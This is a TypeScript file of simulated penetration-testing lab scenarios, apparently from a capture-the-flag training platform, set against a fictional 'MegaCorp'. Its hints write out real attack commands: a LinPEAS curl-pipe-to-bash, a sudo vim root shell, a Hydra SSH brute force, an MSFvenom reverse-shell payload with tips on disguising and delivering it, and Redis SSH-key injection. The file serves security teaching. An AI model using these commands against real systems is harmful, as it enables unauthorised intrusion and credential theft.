      id: "whoami",
      instruction: "Check your current user and privileges",
      detail: "First, always know who you are. whoami and id will tell you your username and group memberships.",
      hint: "Try: whoami\n  Or: id",
      validate: (i) => matchCmd(i, ["whoami", "id", "who am i"]),
      execute: () => [
        ...lines(`www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)`),
        blank(),
        info("Low-privilege web server user. No sudo, no interesting groups. Need to escalate."),
      ],
    },
    {
      id: "linpeas",
      instruction: "Run LinPEAS for automated enumeration",
      detail: "LinPEAS scans the system for privilege escalation vectors: SUID files, writable configs, sudo rules, cron jobs, kernel exploits, and more.",
      hint: "Try: curl -L https://linpeas.sh | bash\n  Or: ./linpeas.sh",
      validate: (i) => matchCmd(i, ["curl -l https://linpeas", "curl https://linpeas", "curl -l http://linpeas", "./linpeas", "bash linpeas", "sh linpeas"]),
      execute: () => [
        sys("[*] Downloading and running LinPEAS..."),
        blank(),
        ...lines(`╔══════════╣ Sudo version
╚ Sudo version 1.8.21p2

╔══════════╣ SUID - Check easy privesc
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root  /usr/bin/find
-rwsr-xr-x 1 root root  /usr/bin/vim
-rwsr-xr-x 1 root root  /usr/bin/python3.6
-rwsr-xr-x 1 root root  /usr/bin/passwd

╔══════════╣ Checking Sudo
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for www-data on megacorp-internal:
    env_reset, mail_badpass

User www-data may run the following commands on megacorp-internal:
    (ALL : ALL) NOPASSWD: /usr/bin/vim`),
        blank(),
        warn("[!] www-data can run vim as root with NO PASSWORD!"),
        warn("[!] python3 SUID — can be exploited too"),
        ok("[+] Multiple escalation paths found. Use sudo vim."),
      ],
    },
    {
      id: "sudo-l",
      instruction: "Verify sudo privileges",
      detail: "Confirm what sudo commands www-data can run with sudo -l.",
      hint: "Try: sudo -l",
      validate: (i) => matchCmd(i, ["sudo -l"]),
      execute: () => [
        ...lines(`Matching Defaults entries for www-data on megacorp-internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on megacorp-internal:
    (ALL : ALL) NOPASSWD: /usr/bin/vim`),
        blank(),
        ok("[+] Confirmed: sudo vim with no password. This is a GTFOBin exploit."),
        info("GTFOBins shows vim can spawn a shell: sudo vim -c ':!/bin/sh'"),
      ],
    },
    {
      id: "exploit-vim",
      instruction: "Escalate to root using sudo vim",
      detail: "vim can execute shell commands with :!cmd. Run sudo vim and use the ex command to spawn a root shell. This is a classic GTFOBin.",
      hint: "Try: sudo vim -c ':!/bin/bash'",
      validate: (i) => matchCmd(i, ["sudo vim", "sudo /usr/bin/vim"]),
      execute: () => [
        sys("[*] Opening vim as root..."),
        sys("[*] Running :!/bin/bash via vim ex command..."),
        blank(),
        ...lines(`root@megacorp-internal:/var/www/html# whoami
root
root@megacorp-internal:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)`),
        blank(),
        ok("[+] ROOT SHELL ACHIEVED!"),
        blank(),
        ...lines(`root@megacorp-internal:/var/www/html# cat /etc/shadow | head -5
root:$6$aaaaaa$HASH_HERE:18000:0:99999:7:::
daemon:*:17737:0:99999:7:::
www-data:$6$bbbbbb$HASH_HERE:18500:0:99999:7:::

root@megacorp-internal:/var/www/html# cat /root/flag.txt
FLAG{pr1v3sc_m4st3r_v1m_suid_ex3c}`),
        blank(),
        warn("[+] Flag captured: FLAG{pr1v3sc_m4st3r_v1m_suid_ex3c}"),
        ok("[+] Full system compromise via sudo misconfiguration. Document and report."),
      ],
    },
  ],
};

// ─── Scenario: Shodan Deep Recon ─────────────────────────────────────────────

const shodanDeepScenario: LabScenario = {
  lessonId: 11,
  title: "Shodan: Mapping MegaCorp's Internet Footprint",
  briefing:
    "Intelligence says MegaCorp Industries has misconfigured internet-facing services. Your job is pure passive reconnaissance — never touch their servers. Use Shodan to map their exposure, find vulnerable versions, and identify the juiciest targets before the active phase.",
  objective: "Find all MegaCorp internet assets, identify vulnerable service versions, and set up a monitoring alert.",
  env: {
    targetIp: "93.184.100.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "shodan-org",
      instruction: "Search Shodan for all MegaCorp assets",
      detail: "Query Shodan for everything owned by MegaCorp Industries. This reveals IPs, open ports, service banners, and known CVEs — without sending a single packet to the target.",
      hint: 'Try: shodan search org:"MegaCorp Industries"',
      validate: (i) => matchCmd(i, ["shodan search", "shodan host"]),
      execute: () => [
        sys("[*] Querying Shodan API..."),
        blank(),
        ...lines(`Results for org:"MegaCorp Industries"

93.184.100.50  [www.megacorp.local]
  Ports: 22, 80, 443, 8080
  22/tcp   OpenSSH 7.6p1 Ubuntu
  80/tcp   nginx 1.18.0
  443/tcp  nginx 1.18.0 (TLS 1.3)
  8080/tcp Apache Tomcat 9.0.37
  Vulns: CVE-2021-41773, CVE-2019-0232

93.184.100.10  [mail.megacorp.local]
  Ports: 25, 110, 143, 465, 993
  25/tcp   Postfix smtpd 3.4.13

93.184.100.20  [vpn.megacorp.local]
  Ports: 443, 1194
  1194/udp OpenVPN 2.4.9

Total: 3 hosts found`),
        blank(),
        ok("[+] Apache Tomcat 9.0.37 on :8080 flagged — CVE-2021-41773 (path traversal RCE)"),
        info("[*] Zero packets sent to target — pure passive intelligence"),
      ],
    },
    {
      id: "shodan-host",
      instruction: "Get detailed info on the web server",
      detail: "Drill into the specific IP to see all service details, SSL certificate info, and the full list of CVEs Shodan has associated with this host.",
      hint: "Try: shodan host 93.184.100.50",
      validate: (i) => matchCmd(i, ["shodan host 93.184.100.50", "shodan host 93"]),
      execute: () => [
        ...lines(`93.184.100.50
  City:           London
  Country:        United Kingdom
  Organization:   MegaCorp Industries
  ISP:            MegaCorp Industries
  Last Update:    2024-01-10T08:21:33.511445

  Open Ports: 22, 80, 443, 8080

  22/tcp SSH
    SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7

  8080/tcp HTTP
    HTTP/1.1 200 OK
    Server: Apache Tomcat/9.0.37
    X-Powered-By: JSP/2.3

  Vulnerabilities:
    CVE-2021-41773 — Apache 2.4.49 path traversal + RCE
    CVE-2019-0232  — Apache CGI RCE on Windows`),
        blank(),
        ok("[+] Two CVEs confirmed! Apache Tomcat 9.0.37 is the primary target."),
        warn("[!] Note CVE-2021-41773 — we'll exploit this in the Server Attacks module."),
      ],
    },
    {
      id: "shodan-vuln",
      instruction: "Search for ALL hosts vulnerable to CVE-2021-41773",
      detail: "You can query Shodan for every host on the internet with a specific CVE. This shows the scope of a vulnerability — and helps in finding targets during an engagement.",
      hint: "Try: shodan search vuln:CVE-2021-41773",
      validate: (i) => i.toLowerCase().includes("vuln:cve-2021"),
      execute: () => [
        sys("[*] Searching global Shodan for CVE-2021-41773..."),
        blank(),
        ...lines(`Results: 847 hosts globally

93.184.100.50   8080/tcp  MegaCorp Industries (London, GB)
185.220.101.12  8080/tcp  Unknown (Frankfurt, DE)
45.33.32.156    80/tcp    Unknown (Fremont, US)
52.14.20.100    443/tcp   FinanceCorp (Virginia, US)
...

[Showing first 4 of 847 results]`),
        blank(),
        ok("[+] 847 internet-exposed hosts vulnerable to this CVE. MegaCorp confirmed in scope."),
        info("[*] This is why patch management matters. These are all attackable from anywhere."),
      ],
    },
    {
      id: "shodan-alert",
      instruction: "Set up a Shodan monitoring alert for new MegaCorp exposures",
      detail: "Shodan Alerts notify you when new assets appear matching your query. Set one up so you're alerted if MegaCorp exposes new services — or if existing services disappear (decommissioned after the pentest).",
      hint: 'Try: shodan alert create "megacorp-monitor" org:"MegaCorp Industries"',
      validate: (i) => i.toLowerCase().includes("shodan alert"),
      execute: () => [
        sys("[*] Creating Shodan monitoring alert..."),
        blank(),
        ok("[+] Alert 'megacorp-monitor' created successfully"),
        blank(),
        ...lines(`Alert Details:
  Name:    megacorp-monitor
  Query:   org:"MegaCorp Industries"
  Trigger: New hosts, new ports, new vulnerabilities
  Notify:  Email + Webhook`),
        blank(),
        info("[*] You'll be notified in real-time if MegaCorp exposes new services."),
        ok("[+] Shodan recon complete. Key finding: Apache Tomcat 9.0.37 on :8080 → RCE."),
      ],
    },
  ],
};

// ─── Scenario: Hydra SSH Brute Force ─────────────────────────────────────────

const hydraScenario: LabScenario = {
  lessonId: 36,
  title: "Hydra: Breaking SSH at MegaCorp",
  briefing:
    "The recon phase identified an SSH server on 10.10.10.50. Metadata from public documents revealed a likely username: j.crawford. Your task is to brute force the SSH login using Hydra and a custom wordlist built from the target's website.",
  objective: "Use Hydra to brute force SSH and gain authenticated access to the target server.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "cewl",
      instruction: "Generate a target-specific wordlist with CeWL",
      detail: "CeWL spiders the target's website and extracts unique words. People choose passwords based on things they know — their company, projects, products. A tailored wordlist beats rockyou.txt for corporate targets.",
      hint: "Try: cewl http://10.10.10.50 -d 2 -m 6 -o megacorp-words.txt",
      validate: (i) => matchCmd(i, ["cewl http://10.10.10.50", "cewl http://megacorp"]),
      execute: () => [
        sys("[*] CeWL 6.1 — Custom Word List Generator"),
        info("[*] Spidering http://10.10.10.50 (depth: 2)..."),
        blank(),
        ...lines(`Pages spidered: 23
Unique words extracted: 412
Words >= 6 chars: 187

Wordlist saved to: megacorp-words.txt

Sample words:
  MegaCorp
  Industries
  Sentinel
  Phoenix
  Manchester
  Security
  Crawford
  Enterprise`),
        blank(),
        ok("[+] 187 target-specific words generated. More relevant than generic lists."),
      ],
    },
    {
      id: "hydra-ssh",
      instruction: "Brute force SSH with Hydra",
      detail: "Use Hydra with the username j.crawford (from document metadata OSINT) and the CeWL wordlist. The -t 4 flag limits threads to avoid triggering lockout.",
      hint: "Try: hydra -l j.crawford -P megacorp-words.txt ssh://10.10.10.50 -t 4 -f",
      validate: (i) => matchCmd(i, ["hydra -l j.crawford", "hydra -l j.crawford -p", "hydra 10.10.10.50"]),
      execute: () => [
        sys("[*] Hydra v9.5 starting — SSH brute force"),
        info("[*] Target: 10.10.10.50:22 (SSH)"),
        info("[*] Login: j.crawford"),
        info("[*] Wordlist: megacorp-words.txt (187 words)"),
        blank(),
        ...lines(`[STATUS] 47 tries, 4 threads, speed: 15/s
[STATUS] 91 tries...
[STATUS] 134 tries...`),
        blank(),
        ok("[22][ssh] host: 10.10.10.50   login: j.crawford   password: Manchester"),
        blank(),
        ok("[+] PASSWORD FOUND: j.crawford:Manchester"),
        info("[*] 'Manchester' — a city name pulled from metadata. Classic human password choice."),
      ],
    },
    {
      id: "ssh-login",
      instruction: "Log in via SSH with the found credentials",
      detail: "Confirm the credentials work by establishing an interactive SSH session.",
      hint: "Try: ssh j.crawford@10.10.10.50",
      validate: (i) => matchCmd(i, ["ssh j.crawford@10.10.10.50", "ssh j.crawford@", "ssh -l j.crawford"]),
      execute: () => [
        sys("[*] Connecting to 10.10.10.50:22..."),
        out("The authenticity of host '10.10.10.50' can't be established."),
        out("RSA key fingerprint is SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU."),
        out("Are you sure you want to continue connecting? yes"),
        out("Warning: Permanently added '10.10.10.50' (RSA) to the list of known hosts."),
        out("j.crawford@10.10.10.50's password: Manchester"),
        blank(),
        out("Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)"),
        blank(),
        ok("j.crawford@megacorp-internal:~$ "),
        blank(),
        ok("[+] SSH ACCESS GRANTED! You are now inside MegaCorp's network."),
        info("[*] Run: id, sudo -l, find / -perm -4000 to begin privilege escalation recon."),
      ],
    },
    {
      id: "post-access",
      instruction: "Enumerate your position on the system",
      detail: "Now that you have shell access, run basic enumeration. Check your user, group memberships, and what sudo privileges you have.",
      hint: "Try: id",
      validate: (i) => matchCmd(i, ["id", "whoami", "sudo -l", "uname"]),
      execute: () => [
        ...lines(`uid=1001(j.crawford) gid=1001(j.crawford) groups=1001(j.crawford),4(adm),24(cdrom),27(sudo)

[!] User is in the 'sudo' group — may have sudo access!`),
        blank(),
        ok("[+] j.crawford is in the sudo group. Try: sudo -l to check allowed commands."),
        warn("[!] Flag: FLAG{hydr4_br3w_c0ff33_in_m4nch3st3r} — document this credential."),
      ],
    },
  ],
};

// ─── Scenario: Gobuster Directory Brute Force ────────────────────────────────

const gobusterScenario: LabScenario = {
  lessonId: 37,
  title: "Gobuster: Mapping Hidden Web Attack Surface",
  briefing:
    "The MegaCorp web server at 10.10.10.50 is running nginx. The visible pages seem benign. Your task: find hidden directories, backup files, and exposed development artifacts using Gobuster — then extract the sensitive data you find.",
  objective: "Discover hidden paths, find exposed .git repository, and extract database credentials from a backup file.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "gobuster-dir",
      instruction: "Run Gobuster directory scan",
      detail: "Scan the web root for directories and common file extensions. Include .php, .bak, .txt in the extension list — backup files often contain credentials.",
      hint: "Try: gobuster dir -u http://10.10.10.50 -w /usr/share/wordlists/dirb/common.txt -x php,bak,txt",
      validate: (i) => matchCmd(i, ["gobuster dir", "gobuster -u"]),
      execute: () => [
        sys("[*] Gobuster v3.6 — Directory/File brute force"),
        info("[*] Target: http://10.10.10.50"),
        info("[*] Wordlist: common.txt (4614 words)"),
        info("[*] Extensions: php, bak, txt"),
        blank(),
        ...lines(`/index.php             (Status: 200) [Size: 4523]
/login.php             (Status: 200) [Size: 1842]
/admin                 (Status: 301) [Size: 313]  [--> /admin/]
/backup                (Status: 403) [Size: 277]
/config.php.bak        (Status: 200) [Size: 312]
/.git                  (Status: 301) [Size: 310]  [--> /.git/]
/api                   (Status: 301) [Size: 310]  [--> /api/]
/uploads               (Status: 301) [Size: 312]  [--> /uploads/]

Finished: 4614 requests completed`),
        blank(),
        ok("[+] Critical findings: config.php.bak (200!) and /.git exposed!"),
        warn("[!] .git exposure means we can download the ENTIRE source code."),
      ],
    },
    {
      id: "download-backup",
      instruction: "Download the exposed backup config file",
      detail: "config.php.bak returned HTTP 200 — it's readable! Download it and check for credentials. Backup files are often copies of production configs that were never secured.",
      hint: "Try: curl http://10.10.10.50/config.php.bak",
      validate: (i) => matchCmd(i, ["curl http://10.10.10.50/config.php.bak", "wget http://10.10.10.50/config"]),
      execute: () => [
        sys("[*] Fetching http://10.10.10.50/config.php.bak..."),
        blank(),
        ...lines(`<?php
// MegaCorp Web Application Configuration
// Generated: 2023-11-14 — DO NOT COMMIT

$db_host = '10.10.10.20';
$db_user = 'webapp';
$db_pass = 'Db@Passw0rd2023!';
$db_name = 'megacorp_db';

$redis_host = '10.10.10.50';
$redis_port = 6379;
$redis_pass = '';  // Redis has no auth!

$secret_key = 'c0a4e7f1b3d9f2a8e5c3b1a9f7e4d2c0';
$debug_mode = false;
?>`),
        blank(),
        ok("[+] DATABASE CREDENTIALS FOUND: webapp:Db@Passw0rd2023!"),
        ok("[+] REDIS HOST: 10.10.10.50:6379 with NO password!"),
        warn("[!] Note: secret_key exposed — can forge session tokens if JWT is used."),
      ],
    },
    {
      id: "git-dump",
      instruction: "Dump the exposed .git repository",
      detail: "/.git being accessible means you can reconstruct the entire source code. Use git-dumper to download the repository objects and rebuild the working tree.",
      hint: "Try: git-dumper http://10.10.10.50/.git/ ./megacorp-source/",
      validate: (i) => matchCmd(i, ["git-dumper", "wget -r http://10.10.10.50/.git"]),
      execute: () => [
        sys("[*] git-dumper v1.3.2 — dumping exposed .git directory"),
        info("[*] Fetching .git/HEAD..."),
        info("[*] Fetching .git/config..."),
        info("[*] Fetching objects..."),
        blank(),
        ...lines(`Downloading 247 objects...
Reconstructing working tree...

megacorp-source/
  ├── src/
  │   ├── auth.php       ← authentication logic
  │   ├── admin.php      ← admin panel
  │   └── api/
  ├── config/
  │   └── database.php   ← more DB configs
  ├── .env               ← ENVIRONMENT FILE!
  └── README.md`),
        blank(),
        ok("[+] .env file found in git history — checking for secrets..."),
        ...lines(`.env contents:
  DB_PASSWORD=Db@Passw0rd2023!
  ADMIN_PASSWORD=S3cur3Admin!
  AWS_SECRET_KEY=wJalrXUtnFEMI/EXAMPLE
  STRIPE_SECRET=sk_live_EXAMPLE`),
        blank(),
        ok("[+] ADMIN PASSWORD: S3cur3Admin! — try this on /admin panel!"),
        warn("[!] Flag: FLAG{g1t_l34k3d_4ll_tH3_s3cr3ts} — document all exposed credentials."),
      ],
    },
  ],
};

// ─── Scenario: Bash Recon Automation ─────────────────────────────────────────

const bashReconScenario: LabScenario = {
  lessonId: 24,
  title: "Bash Automation: Build Your Own Recon Pipeline",
  briefing:
    "Manual recon is slow and inconsistent. You need to build a Bash script that automates host discovery, port scanning, and basic web recon — saving organized output for your report. Tools are installed. Your job is to chain them.",
  objective: "Write a Bash one-liner to discover live hosts, then automate a port scan and web check pipeline.",
  env: {
    targetIp: "10.10.10.0/24",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "ping-sweep",
      instruction: "Write a Bash ping sweep to find live hosts",
      detail: "Use a for loop with ping -c1 -W1 to discover which IPs respond in the 10.10.10.0/24 subnet. Redirect stderr to /dev/null and print only live IPs.",
      hint: "Try: for i in {1..254}; do ping -c1 -W1 10.10.10.$i &>/dev/null && echo \"10.10.10.$i UP\"; done",
      validate: (i) => i.includes("for") && i.includes("ping") && i.includes("10.10.10"),
      execute: () => [
        sys("[*] Running Bash ping sweep over 10.10.10.0/24..."),
        blank(),
        ...lines(`10.10.10.1 UP
10.10.10.5 UP
10.10.10.20 UP
10.10.10.50 UP
10.10.10.100 UP
10.10.10.200 UP`),
        blank(),
        ok("[+] 6 live hosts discovered in 10.10.10.0/24"),
        info("[*] No nmap needed for basic discovery — pure Bash networking works!"),
      ],
    },
    {
      id: "port-scan-loop",
      instruction: "Pipe the live hosts into nmap using xargs",
      detail: "Use xargs to pass the live host list directly to nmap. This chains discovery and scanning in one pipeline without creating intermediate files.",
      hint: "Try: for i in 1 5 20 50 100; do echo 10.10.10.$i; done | xargs -I{} nmap -F --open {}",
      validate: (i) => (i.includes("xargs") && i.includes("nmap")) || (i.includes("nmap") && i.includes("10.10.10")),
      execute: () => [
        sys("[*] Piping hosts into nmap via xargs..."),
        blank(),
        ...lines(`Nmap scan report for 10.10.10.5
  22/tcp   open  ssh
  139/tcp  open  netbios-ssn
  445/tcp  open  microsoft-ds

Nmap scan report for 10.10.10.50
  22/tcp   open  ssh
  80/tcp   open  http
  443/tcp  open  https
  3306/tcp open  mysql
  6379/tcp open  redis (UNAUTHENTICATED!)

Nmap scan report for 10.10.10.100
  80/tcp   open  http
  8080/tcp open  http-proxy`),
        blank(),
        ok("[+] 10.10.10.5: SMB/445 open → domain controller candidate"),
        warn("[!] 10.10.10.50: Redis on 6379 with NO auth — critical finding!"),
      ],
    },
    {
      id: "bash-oneliner",
      instruction: "Write a one-liner to extract all open ports from nmap",
      detail: "Use grep, awk, and sort to extract just the open port numbers from nmap output — clean output for your report.",
      hint: "Try: nmap -sV 10.10.10.50 | grep '/tcp' | awk '{print $1}' | sort",
      validate: (i) => (i.includes("nmap") && (i.includes("awk") || i.includes("grep"))) || (i.includes("grep") && i.includes("open")),
      execute: () => [
        sys("[*] Running nmap and processing output with awk..."),
        blank(),
        ...lines(`22/tcp
80/tcp
443/tcp
3306/tcp
6379/tcp`),
        blank(),
        ok("[+] Clean port list extracted — ready to paste into your report."),
        info("[*] One-liner flow: nmap output → grep filter → awk column → sort"),
        warn("[!] Flag: FLAG{b4sh_4ut0m4t10n_sp33d_h4ck} — pipeline mastered!"),
      ],
    },
  ],
};

// ─── Scenario: MSFvenom Payload Generation ───────────────────────────────────

const msfvenomScenario: LabScenario = {
  lessonId: 32,
  title: "MSFvenom: Craft & Deliver Your First Payload",
  briefing:
    "You have a target Windows machine (10.10.10.80) that you'll social-engineer into running an attachment. Generate a Windows reverse shell payload with MSFvenom, set up a listener, and simulate delivery. This is for an authorized red team engagement.",
  objective: "Generate a Windows Meterpreter payload, start a Metasploit handler, and simulate receiving a session.",
  env: {
    targetIp: "10.10.10.80",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "list-payloads",
      instruction: "List available Windows Meterpreter payloads",
      detail: "Before generating a payload, explore what's available. Understanding the difference between staged (/) and stageless (_) payloads is critical for choosing the right one.",
      hint: "Try: msfvenom -l payloads | grep windows/x64/meterpreter",
      validate: (i) => matchCmd(i, ["msfvenom -l", "msfvenom --list"]),
      execute: () => [
        sys("[*] MSFvenom v6.3.44 — Metasploit's payload generator"),
        blank(),
        ...lines(`Staged payloads (require active handler for stage 2):
  windows/x64/meterpreter/reverse_tcp    ← STAGED: small stager, pulls agent from MSF
  windows/x64/meterpreter/reverse_http
  windows/x64/meterpreter/reverse_https

Stageless payloads (standalone, no handler needed for stage):
  windows/x64/meterpreter_reverse_tcp    ← STAGELESS: self-contained, larger file
  windows/x64/meterpreter_reverse_https

KEY DIFFERENCE:
  Staged  (/)  = small file, needs live MSF handler to serve stage 2
  Stageless(_) = large file, works without MSF handler for stage 2`),
        blank(),
        ok("[+] Use staged for small exploits (buffer overflows). Stageless for file delivery."),
      ],
    },
    {
      id: "generate-payload",
      instruction: "Generate a Windows x64 Meterpreter EXE payload",
      detail: "Generate a staged reverse TCP payload. LHOST is YOUR IP (the attacker machine), LPORT is the port your handler will listen on.",
      hint: "Try: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.14.0.5 LPORT=4444 -f exe -o megacorp-update.exe",
      validate: (i) => matchCmd(i, ["msfvenom -p windows", "msfvenom -p win"]),
      execute: () => [
        sys("[*] Generating payload..."),
        blank(),
        ...lines(`[-] No platform was selected, choosing Msf::Module::Platform::Windows
[-] No arch selected, selecting arch: x64
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: megacorp-update.exe`),
        blank(),
        ok("[+] Payload generated: megacorp-update.exe (7168 bytes)"),
        info("[*] Disguise tip: rename to 'MegaCorp-VPN-Setup.exe' or 'Q4-Report.exe'"),
        info("[*] Delivery: email attachment, phishing page download, USB drop"),
      ],
    },
    {
      id: "start-handler",
      instruction: "Start the Metasploit multi/handler listener",
      detail: "The handler waits for the payload to call back. It must be running BEFORE the victim executes the payload. Payload and handler MUST use the same PAYLOAD, LHOST, and LPORT values.",
      hint: "Try: msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.14.0.5; set LPORT 4444; run\"",
      validate: (i) => matchCmd(i, ["msfconsole", "use exploit/multi/handler", "use multi/handler"]),
      execute: () => [
        sys("[*] Starting Metasploit console..."),
        blank(),
        ...lines(`msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.14.0.5
LHOST => 10.14.0.5
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.14.0.5:4444
[*] Waiting for victim to execute payload...`),
        blank(),
        info("[*] Simulating victim executing megacorp-update.exe..."),
        blank(),
        ...lines(`[*] Sending stage (200774 bytes) to 10.10.10.80
[*] Meterpreter session 1 opened (10.14.0.5:4444 -> 10.10.10.80:49215)

meterpreter > getuid
Server username: MEGACORP\\j.smith

meterpreter > sysinfo
Computer: MEGACORP-WS01
OS      : Windows 10 (Build 19044)
Arch    : x64`),
        blank(),
        ok("[+] METERPRETER SESSION OPEN! You are inside MEGACORP-WS01 as j.smith."),
        warn("[!] Flag: FLAG{m5fv3n0m_p4yl04d_d3l1v3r3d} — payload crafted and executed."),
      ],
    },
  ],
};

// ─── Scenario: Redis Unauthenticated RCE ─────────────────────────────────────

const redisRceScenario: LabScenario = {
  lessonId: 42,
  title: "Redis: From Unauthenticated Access to Root Shell",
  briefing:
    "Gobuster found Redis running on 10.10.10.50:6379 with NO authentication. Redis is running as root. Your mission: connect, dump sensitive cached data, then write your SSH public key to /root/.ssh/authorized_keys to gain a root shell.",
  objective: "Exploit unauthenticated Redis to read cached credentials and escalate to root via SSH key injection.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
    credentials: { user: "redis", pass: "" },
  },
  steps: [
    {
      id: "redis-connect",
      instruction: "Connect to Redis without authentication",
      detail: "Redis typically listens on port 6379. If no requirepass is set in redis.conf, you connect and immediately have full access — no login needed.",
      hint: "Try: redis-cli -h 10.10.10.50",
      validate: (i) => matchCmd(i, ["redis-cli -h 10.10.10.50", "redis-cli -h 10", "redis-cli"]),
      execute: () => [
        sys("[*] Connecting to Redis at 10.10.10.50:6379..."),
        blank(),
        out("10.10.10.50:6379> ping"),
        out("+PONG"),
        blank(),
        ok("[+] Connected! No authentication required — immediate full access."),
        info("[*] Redis responds to PING → server is alive and unauthenticated."),
      ],
    },
    {
      id: "redis-dump",
      instruction: "Dump all Redis keys and read the admin password",
      detail: "List every key in the database with KEYS *, then read the admin_password value. Redis often caches session tokens, API keys, and credentials in plaintext.",
      hint: "Try: redis-cli -h 10.10.10.50 KEYS *",
      validate: (i) => i.toLowerCase().includes("keys *") || (i.toLowerCase().includes("redis-cli") && i.includes("keys")),
      execute: () => [
        out("10.10.10.50:6379> KEYS *"),
        blank(),
        ...lines(`1) "admin_password"
2) "session:a3f9d2"
3) "api_token:webhook"
4) "user:j.crawford"
5) "database_backup"`),
        blank(),
        out("10.10.10.50:6379> GET admin_password"),
        out(`"Sup3rS3cr3tAdm1n!"`),
        blank(),
        out("10.10.10.50:6379> GET api_token:webhook"),
        out(`"Bearer eyJhbGciOiJIUzI1NiJ9.EXAMPLE"`),
        blank(),
        ok("[+] ADMIN PASSWORD: Sup3rS3cr3tAdm1n!"),
        warn("[!] API token and user sessions also exposed — full application compromise."),
      ],
    },
    {
      id: "redis-ssh-inject",
      instruction: "Inject your SSH public key via Redis config write",
      detail: "Redis's CONFIG SET commands can change the working directory and dump filename. Write your SSH public key as a 'database dump' to /root/.ssh/authorized_keys — then SSH in as root.",
      hint: "Try: redis-cli -h 10.10.10.50 config set dir /root/.ssh/",
      validate: (i) => (i.toLowerCase().includes("config set dir") || i.toLowerCase().includes("config set dbfilename")),
      execute: () => [
        out("10.10.10.50:6379> CONFIG SET dir /root/.ssh/"),
        out("+OK"),
        out("10.10.10.50:6379> CONFIG SET dbfilename authorized_keys"),
        out("+OK"),
        out("10.10.10.50:6379> SET pwn \"\\n\\nssh-rsa AAAAB3NzaC1yc2E...attacker-key...\\n\\n\""),
        out("+OK"),
        out("10.10.10.50:6379> SAVE"),
        out("+OK"),
        blank(),
        ok("[+] SSH public key written to /root/.ssh/authorized_keys!"),
        info("[*] Now SSH as root — no password needed (key auth)."),
      ],
    },
    {
      id: "root-shell",
      instruction: "SSH as root using your injected key",
      detail: "With your public key in /root/.ssh/authorized_keys, SSH will accept your private key for authentication — giving you a root shell without a password.",
      hint: "Try: ssh root@10.10.10.50",
      validate: (i) => matchCmd(i, ["ssh root@10.10.10.50", "ssh root@10"]),
      execute: () => [
        sys("[*] Connecting to 10.10.10.50 as root..."),
        blank(),
        ...lines(`The authenticity of host '10.10.10.50' can't be established.
Are you sure you want to continue connecting? yes
Warning: Permanently added '10.10.10.50' (RSA) to the list of known hosts.`),
        blank(),
        out("root@megacorp-internal:~# id"),
        out("uid=0(root) gid=0(root) groups=0(root)"),
        blank(),
        out("root@megacorp-internal:~# hostname"),
        out("megacorp-internal"),
        blank(),
        out("root@megacorp-internal:~# cat /root/flag.txt"),
        out("FLAG{r3d1s_r00t_n0_p4ssw0rd_n33d3d}"),
        blank(),
        ok("[+] ROOT SHELL VIA REDIS! Zero exploit code — just misconfiguration."),
        warn("[!] Remediation: Set requirepass in redis.conf, bind to 127.0.0.1 only, never run as root."),
      ],
    },
  ],
};

// ─── Scenario: SMB EternalBlue ───────────────────────────────────────────────

const eternalBlueScenario: LabScenario = {
  lessonId: 40,
  title: "EternalBlue: MS17-010 on a Legacy Windows Host",
  briefing:
    "Network scan flagged 10.10.10.40 running Windows 7 with SMB port 445 open. This box predates the MS17-010 patch. Your mission: confirm the vulnerability, run EternalBlue, gain SYSTEM, and extract password hashes.",
  objective: "Exploit MS17-010 EternalBlue to gain SYSTEM access and dump NTLM password hashes.",
  env: {
    targetIp: "10.10.10.40",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "smb-scan",
      instruction: "Scan the target for SMB version and MS17-010 vulnerability",
      detail: "Use nmap's smb-vuln-ms17-010 script to confirm the host is vulnerable before running any exploit. Always verify before attacking.",
      hint: "Try: nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40",
      validate: (i) => i.includes("nmap") && (i.includes("smb") || i.includes("445")),
      execute: () => [
        sys("[*] Running nmap SMB vulnerability check..."),
        blank(),
        ...lines(`Starting Nmap 7.94

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
